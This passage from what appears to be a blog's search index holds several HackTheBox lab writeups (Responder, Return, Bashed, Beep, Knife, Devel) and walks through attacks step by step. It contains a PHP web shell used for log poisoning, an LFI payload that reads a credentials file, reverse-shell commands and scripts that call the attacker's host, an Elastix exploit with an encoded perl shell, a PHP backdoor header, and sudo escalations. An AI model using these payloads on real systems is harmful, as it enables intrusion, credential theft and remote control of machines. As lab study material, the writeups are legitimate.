","date":"09-04-2022","objectID":"/posts/htb/responder/:3:0","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Log Poisoning As you know, from the First Method section. This machine is vulnerable to local file inclusion. So, I’m gonna try to gain remote code execution through log poisoning. Here’s the article talking about it hackingarticles - apache log poisoning through lfi that I found. The result from the Nmap scan shows us this is an apache server running on Windows. Let’s verify that we can read the log file that locates in C:\\xampp\\apache\\logs\\access.log by default and to do this I’m gonna use the BurpSuite. read log file Looks like I can read the log file. Now, let’s poison the User-Agent header with a basic PHP web shell by putting this code (down below). Then, click send. \u003c?php system($_REQUEST['cmd']);?\u003e send php webshell The log should now contain PHP code. The LFI vulnerability should execute this code and we should be able to gain remote code execution by putting the \u0026cmd=whoami at the end of the url. The command successfully ran. execute whoami ","date":"09-04-2022","objectID":"/posts/htb/responder/:3:1","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Nishang: Invoke-PowerShellTcp.ps1 Now, we have the RCE, and let’s try to gain the reverse shell. I’m gonna use the Nishang reverse shell which is Invoke-PowerShellTcp.ps1 but first, I’m gonna make a new directory named www and copy the powershell file into that directory. Then, I’m gonna open that file and select one of the example lines available and change the Ip address and port. After that, put it in the last line in the file. powershell reverse shell Now, I’m running the python http server into the www directory. Then, download the reverse shell file using BurpSuite and don’t forget to url encode it. Make sure to run the nc listener with rlwrap on the port that you specify in the reverse shell file. serve python server execute powershell reverse shell shell as administrator TADAA!! we’ve got the shell and can read the flag. ","date":"09-04-2022","objectID":"/posts/htb/responder/:3:2","tags":["lfi","rce","log-poisoning","responder.py","NTLMv2","hashcat","reverse-powershell","php-webshell","evil-winrm"],"title":"HackTheBox - Responder Writeup","uri":"/posts/htb/responder/"},{"categories":["HacktheBox"],"content":"Nmap First, let’s start scanning the IP address with the Nmap. ","date":"02-04-2022","objectID":"/posts/htb/return/:1:0","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"result # Nmap 7.92 scan initiated Sat Apr 2 02:24:05 2022 as: nmap -sC -sV -oN nmap/return 10.10.11.108 Nmap scan report for 10.10.11.108 Host is up (0.053s latency). Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-title: HTB Printer Admin Panel 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-01 18:42:49Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2022-04-01T18:42:56 |_ start_date: N/A |_clock-skew: 18m34s | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Apr 2 02:24:25 2022 -- 1 IP address (1 host up) scanned in 20.29 seconds That’s a bunch of open ports. Turns out, this machine is an Active Directory Domain. ","date":"02-04-2022","objectID":"/posts/htb/return/:1:1","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"Http The port 80 is got my attention because the Nmap scan result says, the title of the webpage is HTB Printer Admin Panel. Let’s take a look at it, which is running on Microsoft IIS. printer webpage It is a simple webpage and a lot of the buttons on the navigation bar don’t work at all. However, when I clicked on the Settings button. I’ve been greeted by this! printer settings So, I tried to change the password first and play around with it but nothing has happens. Then, I google around and found this HackTricks - AD information in printers. It highlights some blogs too: https://www.ceos3c.com/hacking/obtaining-domain-credentials-printer-netcat/ https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856 https://grimhacker.com/2018/03/09/just-a-printer/ ","date":"02-04-2022","objectID":"/posts/htb/return/:2:0","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"NetCat First, let’s start the nc and listen to port 389. Then, in the settings page, change the Server Address into your IP address which is tun0, and click Update. put tun0 ip grab the credentials In the image above. The nc successfully grabs the password and it’s in form of clear-text. ","date":"02-04-2022","objectID":"/posts/htb/return/:2:1","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"Evil-WinRM Now, I have the password of the svc-printer user. Let’s try to connect to this machine by using Evil-WinRM. login as svc-printer YES! I’m in. This user also can read the user flag located in this directory C:\\Users\\svc-printer\\Desktop. ","date":"02-04-2022","objectID":"/posts/htb/return/:3:0","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"Server Operators The first thing I love to do is run this command whoami /all. This command is gonna display user, group, and privileges information for the user who is currently logged on. Server Operators group Here’s the result. The BUILTIN\\Server Operators caught my eyes. Why? because this group can create and delete network shared resources, start and stop services, back up and restore files. Need more information on this group. Here’s the link Microsoft - Server Operators So, I start googling around and found this cube0x0 - Poc’ing Beyond Domain Admin - Part 1. This article shows us how to stop and start services. ","date":"02-04-2022","objectID":"/posts/htb/return/:3:1","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"nc.exe First, I’m gonna start the python http server in my attack machine in the directory called www and it contains the copy of the nc.exe file. Then, download it into the victim machine which is a Windows machine. transfer nc.exe ","date":"02-04-2022","objectID":"/posts/htb/return/:3:2","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"System Shell So, In this article is straight forward and I’m gonna change the service configuration. In this case, I’m gonna change the VSS config to run the nc.exe but first, I’m gonna start the nc listener in my attack machine on my desired port. Anyways, the command is down below: # Here's the command sc.exe config VSS binpath=\"C:\\Users\\svc-printer\\Desktop\\nc.exe -e cmd.exe 10.10.14.14 9901\" sc.exe stop VSS sc.exe start VSS shell as nt authority\\system TA DAAA!!! now I’m an authority\\system. ","date":"02-04-2022","objectID":"/posts/htb/return/:4:0","tags":["server-operators-group","printer","sc.exe","evil-winrm"],"title":"HackTheBox - Return Writeup","uri":"/posts/htb/return/"},{"categories":["HacktheBox"],"content":"Nmap As always. I’m gonna run the Nmap scan. Here is the result of the scan. ","date":"01-03-2022","objectID":"/posts/htb/bashed/:1:0","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"result # Nmap 7.92 scan initiated Sat Feb 26 01:50:32 2022 as: nmap -sC -sV -oN nmap/bashed 10.10.10.68 Nmap scan report for 10.10.10.68 Host is up (0.054s latency). Not shown: 999 closed tcp ports (reset) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-title: Arrexel's Development Site |_http-server-header: Apache/2.4.18 (Ubuntu) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Sat Feb 26 01:50:44 2022 -- 1 IP address (1 host up) scanned in 12.17 seconds port 80/HTTP is the only one open. ","date":"01-03-2022","objectID":"/posts/htb/bashed/:1:1","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"Http Let’s take a look at the website. phpbash webpage Turns out, the phpbash is a web shell. Well, it is an open-source project and I found the GitHub link on the site itself. https://github.com/Arrexel/phpbash On the GitHub page. The phpbash location looks like at the uploads directory. However, when I went to the uploads directory it’s nothing there. check upload directory ","date":"01-03-2022","objectID":"/posts/htb/bashed/:1:2","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"Gobuster So, I’m gonna run the gobuster to search all hidden directories. It found a bunch of directories but the /dev really caught my eye. gobuster ","date":"01-03-2022","objectID":"/posts/htb/bashed/:1:3","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"/dev Let’s take a look at the /dev directory. Wow! found it. Now, I’m just clicking the phpbash.php and I’ve got the web shell as the www-data user. directory listing phpbash web shell ","date":"01-03-2022","objectID":"/posts/htb/bashed/:1:4","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"Reverse Shell Let’s try to get the proper reverse shell. I have already tried a bunch of things to gain the reverse shell. However, the base64 method seems to be working. So, the first thing is I’m gonna encoded this bash reverse shell into base64 bash oneliner base64 Then, I’m gonna put it into the input of phpbash. Down below; is a syntax should be. Make sure to set up an nc listener first. execute reverse shell shell as www-data ","date":"01-03-2022","objectID":"/posts/htb/bashed/:2:0","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"Upgrade shell using python YES! I got the shell. Let’s upgrade this shell into a proper shell. First, let’s import called /bin/bash using python with pty module. Then, export the terminal to have the clear screen and press Ctrl + Z to put it, into the background. Last, type the stty raw -echo; fg and press Enter 2 times, and there you go! -\u003e python3 -c 'import pty;pty.spawn(\"/bin/bash\")' -\u003e export TERM=xterm Ctrl + Z -\u003e stty raw -echo; fg ","date":"01-03-2022","objectID":"/posts/htb/bashed/:2:1","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"User scriptmanager The first thing a love to do when get access to the machine. I love to check the sudo permission. Let’s check it with sudo -l. Shockingly, I can run the sudo with the www-data user. check sudo permission Looks like, I can run any command with the scriptmanager user without authentication. Well, let’s change into that user with this syntax; sudo -u scriptmanager bash change user to scriptmanager ","date":"01-03-2022","objectID":"/posts/htb/bashed/:2:2","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"/scripts This is caught by surprise. I found the /scripts directory located in the base /. Luckily, I already become the scriptmanager. Let’s take a peek into the particular directory. found /scripts directory So, the directory content 2 files are called test.py and test.txt. However, the test.txt is owned by the root user. After endless investigation ;) Looks like any python file in here is gonna run by root. Like a cronjob. contents in /scripts ","date":"01-03-2022","objectID":"/posts/htb/bashed/:2:3","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"Root Shell What we know. Any python file in that directory got to execute. So, I’m gonna make a python file that contains reverse shell. After, all set up just wait for a minute, and BOOM! make sure to setup nc listener first # Python Reverse Shell import socket,subprocess,os s=socket.socket(socket.AF_INET,socket.SOCK_STREAM) s.connect((\"TUN0\",PORT)) os.dup2(s.fileno(),0) os.dup2(s.fileno(),1) os.dup2(s.fileno(),2) import pty; pty.spawn(\"/bin/bash\") shell as root ","date":"01-03-2022","objectID":"/posts/htb/bashed/:3:0","tags":["python-shell","gobuster","crontab","upgrade-shell-python","phpbash-webshell"],"title":"HackTheBox - Bashed Writeup","uri":"/posts/htb/bashed/"},{"categories":["HacktheBox"],"content":"Nmap As always. I’m gonna run the Nmap scan against this IP address 10.10.10.7. Here is the result of the scan ","date":"21-01-2022","objectID":"/posts/htb/beep/:1:0","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"the result # Nmap 7.92 scan initiated Sun Jan 16 05:37:13 2022 as: nmap -sC -sV -p- -oN nmap/beep_all 10.10.10.7 Nmap scan report for 10.10.10.7 Host is up (0.056s latency). Not shown: 65519 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) |_ 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) 25/tcp open smtp Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http Apache httpd 2.2.3 |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ 110/tcp open pop3 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: PIPELINING TOP APOP LOGIN-DELAY(0) EXPIRE(NEVER) UIDL USER STLS IMPLEMENTATION(Cyrus POP3 server v2) AUTH-RESP-CODE RESP-CODES |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) 111/tcp open rpcbind 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 875/udp status |_ 100024 1 878/tcp status 143/tcp open imap Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_imap-capabilities: RENAME OK THREAD=REFERENCES IMAP4rev1 SORT=MODSEQ ID X-NETSCAPE LIST-SUBSCRIBED ACL NAMESPACE CATENATE LISTEXT RIGHTS=kxte SORT NO QUOTA IDLE CONDSTORE IMAP4 ANNOTATEMORE THREAD=ORDEREDSUBJECT BINARY ATOMIC URLAUTHA0001 CHILDREN UNSELECT Completed UIDPLUS MULTIAPPEND LITERAL+ MAILBOX-REFERRALS STARTTLS |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_imap-ntlm-info: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) 443/tcp open ssl/http Apache httpd 2.2.3 ((CentOS)) |_http-server-header: Apache/2.2.3 (CentOS) |_ssl-date: 2022-01-15T22:41:00+00:00; +1h00m01s from scanner time. | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=-- | Not valid before: 2017-04-07T08:22:08 |_Not valid after: 2018-04-07T08:22:08 | http-robots.txt: 1 disallowed entry |_/ |_http-title: Elastix - Login page 878/tcp open status 1 (RPC #100024) 993/tcp open ssl/imap Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 Cyrus pop3d |_ssl-known-key: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) 3306/tcp open mysql MySQL (unauthorized) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) 4190/tcp open sieve Cyrus timsieved 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 (included w/cyrus imap) 4445/tcp open upnotifyp? 4559/tcp open hylafax HylaFAX 4.3.10 5038/tcp open asterisk Asterisk Call Manager 1.1 10000/tcp open http MiniServ 1.570 (Webmin httpd) |_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1). Service Info: Hosts: beep.localdomain, 127.0.0.1, example.com, localhost; OS: Unix Host script results: |_clock-skew: 1h00m00s Service detection performed. Please report any inco","date":"21-01-2022","objectID":"/posts/htb/beep/:1:1","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"Webserver This machine has apache running on port 80. When I visited the page it was redirected into port 443 which is the Elastix login page. elastix login page ","date":"21-01-2022","objectID":"/posts/htb/beep/:1:2","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"Gobuster Well, I’m gonna run the gobuster on this webserver. Try to find any hidden directory on it. I’m gonna use the PHP as -x extension because this server running on PHP. gobuster ","date":"21-01-2022","objectID":"/posts/htb/beep/:1:3","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"/admin The /admin really does sound good to me. When I visited the admin page. It’s prompt me with login forms. admin login prompt I try a bunch of passwords such as admin:admin but it doesn’t work. However, when I clicked the cancel button. It goes to this page https://10.10.10.7/admin/config.php and displays the Unauthorized message. freepbx page ","date":"21-01-2022","objectID":"/posts/htb/beep/:1:4","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"Local File Inclusion/LFI This box has an LFI tag on it. I know it sounds not fair at all but information matters. So, I’m run the searchsploit and found this. found exploit in searchsploit I’m gonna mirror/copy this exploit in my current directory with -m flag. Here is the exploit/PoC : #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00\u0026module=Accounts\u0026action it’s basically, using current_language as the parameter. This PoC already includes the config file on it. I’m gonna copy/paste this in my browser and VOILA! read config file I managed to grab a bunch of passwords that appear in this file but a lot of passwords seem to be commented out. Just one password does not get commented out and appears more often in here. ","date":"21-01-2022","objectID":"/posts/htb/beep/:1:5","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"Method: 1 ","date":"21-01-2022","objectID":"/posts/htb/beep/:2:0","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"SSH The Nmap scan result shows us port 22 is open. Well, I’ve got the potential password and don’t know what users it belongs to. So, I’m gonna try my luck to go with the root user Error Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 If you get one of these errors just like me. You need to run an ssh command like this Tip ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 root@10.10.10.7 source - Solution for SSH unable to Negotiate Errors ssh as root Finally, I login in as root through SSH. Let’s get the user and root flags. ","date":"21-01-2022","objectID":"/posts/htb/beep/:2:1","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"the flag flags ","date":"21-01-2022","objectID":"/posts/htb/beep/:2:2","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"Method: 2 ","date":"21-01-2022","objectID":"/posts/htb/beep/:3:0","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"RCE The last exploit I’m using was LFI 'graph.php' and the version of Elastix was 2.2.0 and this RCE have the same version of Elastix. freepbx rce As always, I’m gonna mirror/copy this exploit into my current working directory with the -m flag. When I ran the exploit it shows a bunch of errors regard to SSL. I tried fixing the error by changing the python code and it was painful but I managed to fix it. Here is the code: ","date":"21-01-2022","objectID":"/posts/htb/beep/:3:1","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"18650.py3 #!/usr/bin/python3 import ssl, urllib3 rhost = \"10.10.10.7\" lhost = input(\"lhost\u003e: \") lport = input(\"lport\u003e: \") ext = input(\"ext\u003e: \") head = f\"https://{rhost}/recordings/misc/callme_page.php?action=c\u0026callmenum={ext}@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20\" payload = f\"perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22{lhost}%3a{lport}%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A'\" url = head + payload # SSL Handler urllib3.disable_warnings() http = urllib3.PoolManager(cert_reqs=\"CERT_NONE\") # Execute print(\"ExPl0itInG...\") http.request(\"GET\", url) ","date":"21-01-2022","objectID":"/posts/htb/beep/:3:2","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"svwar/SIPVicious I ran the exploit one more time and it doesn’t work. I’m speechless and I saw the extension in the original script that set the value into 1000 and maybe this is not a valid extension. So, I’m gonna run the svwar/SIPVicious tool to identify a working extension. I’m gonna run this command: svwar -m INVITE -e100-400 10.10.10.7 find valid extension ","date":"21-01-2022","objectID":"/posts/htb/beep/:3:3","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"Shell as Asterisk Now, let’s run the exploit again and make sure to set up the Netcat listener first. shell as asterisk YES! it worked. Based on the comment in the original exploit, I can be a root user by using nmap --interactive. Let’s do it. shell as root TADAA!! Now, I’m a root user. ","date":"21-01-2022","objectID":"/posts/htb/beep/:4:0","tags":["lfi","rce","ssh","gobuster","svwar/sipvicious","GTFOBins","python","SUID","elastix","freepbx"],"title":"HackTheBox - Beep Writeup","uri":"/posts/htb/beep/"},{"categories":["HacktheBox"],"content":"Enumeration ","date":"15-01-2022","objectID":"/posts/htb/knife/:1:0","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"Nmap First, let’s start with the Nmap scan. Here is the result of the scan. ","date":"15-01-2022","objectID":"/posts/htb/knife/:1:1","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"the result nmap scan result I ran another Nmap scan against all ports. However, the result still returns the same. So, that’s not much we can do. ","date":"15-01-2022","objectID":"/posts/htb/knife/:1:2","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"Webserver Let’s navigate to the website on port 80. It’s just one big landing page and doesn’t have anything interesting in it. I also checked the source of this page and nothing. webpage ","date":"15-01-2022","objectID":"/posts/htb/knife/:1:3","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"Gobuster Now, I’m gonna run the gobuster to find any hidden directory on this webserver. Turns out, this is a PHP webserver. So, I’m gonna search any directory and file that have PHP extensions. Unfortunately, the result is nothing and I ran another scan, and still the same. ","date":"15-01-2022","objectID":"/posts/htb/knife/:1:4","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"X-Powered-By Now, I do not understand how I’m gonna get into this machine. I’ve already checked the source code and nothing. Now, let’s check the header of this page. PHP/8.1.0-dev Hidden Helpers: Security-Focused HTTP Headers to Protect Against Vulnerabilities ","date":"15-01-2022","objectID":"/posts/htb/knife/:1:5","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"RCE Great!. At least I got some information. Turns out, this webserver runs on the PHP/8.1.1-dev version. Like always I’m checking on searchsploit does this version have any exploit and YES!. ","date":"15-01-2022","objectID":"/posts/htb/knife/:1:6","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"Foothold/Gaining Access found exploit for PHP/8.1.0-dev This one caught my eyes. I’m gonna mirror/copy these exploits into my current directory with the -m flag. Here is the comment in this python script Comment An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header. The following exploit uses the backdoor to provide a pseudo shell on the host. PHP 8.1.0-dev - ‘User-Agentt’ Remote Code Execution ","date":"15-01-2022","objectID":"/posts/htb/knife/:2:0","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"PHP backdoor Based on the comment and exploit itself. I need to add the User-Agentt header, like this User-Agentt: zerodiumsystem('cmd');. Let’s try to get the reverse-shell on this machine. I’m gonna use burpsuite to do this. Make sure you set up the listener first. execute bash reverse shell ","date":"15-01-2022","objectID":"/posts/htb/knife/:2:1","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"Shell YES! I’ve got the shell as James. Let’s upgrade the shell real quick with python3 -c 'import pty;pty.spawn(\"/bin/bash\")' and CTRL + z (background) , type stty raw -echo; fg press Return 2 times, lastly export TERM=xterm to have beautiful clear screen. user flag ","date":"15-01-2022","objectID":"/posts/htb/knife/:2:2","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"Privilege Escalation Now, I have the user flag. Let’s hunt for the next flag. First, what I like to do is check the sudo permission with sudo -l. Turns out, this user can run some applications with no password needed. Let’s check the app. check sudo permission Well, it looks like a legitimate application. So, I’m gonna search on GTFOBins. About Knife GTFOBins knife I’m more interested in the sudo section of this exploit with type this in the terminal sudo /usr/bin/knife exec -E 'exec \"/bin/bash\"'. I’m becoming the root user. Here’s the final flag. root flag ","date":"15-01-2022","objectID":"/posts/htb/knife/:3:0","tags":["GTFOBins","rce","gobuster","PHP/8.1.0-dev","php-backdoor"],"title":"HackTheBox - Knife Writeup","uri":"/posts/htb/knife/"},{"categories":["HacktheBox"],"content":"Enumeration scan top 1000 ports nmap -sC -sV -oN nmap/initial 10.10.10.5 the result nmap initial scan all ports scan nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.5 the result nmap allports scan ","date":"27-08-2021","objectID":"/posts/htb/devel/:1:0","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"Open Ports We all know both Nmap scan shows us, just 2 open ports 21/FTP = Microsoft ftpd 80/HTTP = Microsoft IIS httpd 7.5 ","date":"27-08-2021","objectID":"/posts/htb/devel/:1:1","tags":["aspx-reverse-shell","CVE-2011-1249","MS11-046"],"title":"HackTheBox - Devel Writeup","uri":"/posts/htb/devel/"},{"categories":["HacktheBox"],"content":"FTP File Transfer Protocol [FTP] on this machine is open and allowed login 